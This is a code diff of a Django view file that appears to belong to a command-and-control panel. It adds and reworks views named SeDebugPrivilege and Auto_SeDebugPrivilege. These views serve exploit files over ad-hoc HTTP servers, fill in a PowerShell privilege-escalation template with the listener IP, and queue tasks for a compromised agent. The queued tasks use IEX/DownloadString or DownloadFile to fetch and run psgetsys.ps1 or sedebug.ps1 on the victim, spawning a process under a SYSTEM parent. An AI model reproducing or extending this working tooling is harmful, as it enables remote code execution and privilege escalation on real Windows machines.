@@ -663,37 +663,29 @@ def tasklist (request):
         return render(request, 'blog/listeners.html')
 
 
-#userinfo >> sedebug >> enable
-#tasklist >> winlogon >> pid
-#exec_with...
 
-##whoami /priv > $env:userprofile+"/privs";$file=$env:userprofile+"/privs";$h=Get-content $file | select-string "^winlogon.exe";
-#
-#
-def Exec_With_Prnt_Priv(request):
+
+def SeDebugPrivilege(request):
     if request.method=='POST':
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
-        agentTask.save()
-        path_to_execute = request.POST['path_to_execute'] ##
-        # pid = request.POST['pid'] ##
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
-        agentTask.save() 
-        system_pid = request.POST['system_pid']    
-        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        path_to_execute = request.POST['path_to_execute'] ##
-        # pid = request.POST['pid'] ##
+
+        pid = request.POST['pid'] ##
+        path_to_execute = request.POST['path_to_execute']
+
         listenerdata = ListenerForm.objects.order_by("-created_date").get()
         ip = listenerdata.ip
+
         agentdata = Agent.objects.filter(name=agent).values()[0]
         username = agentdata['username']
         username= username.split("\\")
+
         os.system("timeout 30 python -m http.server 8888 --directory {} & ".format(tools_path))
-        # os.system("timeout 20 python -m http.server 4444 --directory /tmp & ".format(tools_path))
+
         f = open("{}".format(tools_path+"/Exploitation/windows/SeDebugPriv"), "rt")
         exep = f.read()
         exep = exep.replace("replace_ip",ip)
@@ -702,9 +694,47 @@ def Exec_With_Prnt_Priv(request):
         with open("/tmp/sedebug.ps1", "a") as f:
             f.write(exep)
             f.close
-        #;powershell -file "$env:userprofile\sedebug.ps1
-        # task= '(New-Object Net.WebClient).DownloadFile(\'http://{0}:4444/sedebug.ps1\', \'c:/users/{1}/test.ps1\');powershell -file c:/users/{1}/test.ps1'.format(ip,username[1])
-        task= 'IEX(New-Object Net.WebClient).DownloadString(\'http://{}:8888/psgetsys.ps1\');[MyProcess]::CreateProcessFromParent({},\'{}\','')'.format(ip,pid,path_to_execute)
+
+        task= 'IEX(New-Object Net.WebClient).DownloadString(\'http://{}:8888/psgetsys.ps1\');[MyProcess]::CreateProcessFromParent({},\'{}\',"")'.format(ip,pid,path_to_execute)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "a") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+def Auto_SeDebugPrivilege (request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
+        agentTask.save()
+ 
+        path_to_execute = request.POST['path_to_execute']
+
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+
+        agentdata = Agent.objects.filter(name=agent).values()[0]
+        username = agentdata['username']
+        username= username.split("\\")
+
+        os.system("timeout 30 python -m http.server 8888 --directory {} & ".format(tools_path))
+        os.system("timeout 20 python -m http.server 4444 --directory /tmp & ".format(tools_path))
+
+        f = open("{}".format(tools_path+"/Exploitation/windows/SeDebugPriv"), "rt")
+        exep = f.read()
+        exep = exep.replace("replace_ip",ip)
+        exep = exep.replace("replace_exec_path",path_to_execute)
+
+        with open("/tmp/sedebug.ps1", "a") as f:
+            f.write(exep)
+            f.close
+
+        task= '(New-Object Net.WebClient).DownloadFile(\'http://{0}:4444/sedebug.ps1\', \'c:/users/{1}/test.ps1\');powershell -file c:/users/{1}/test.ps1'.format(ip,username[1])
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
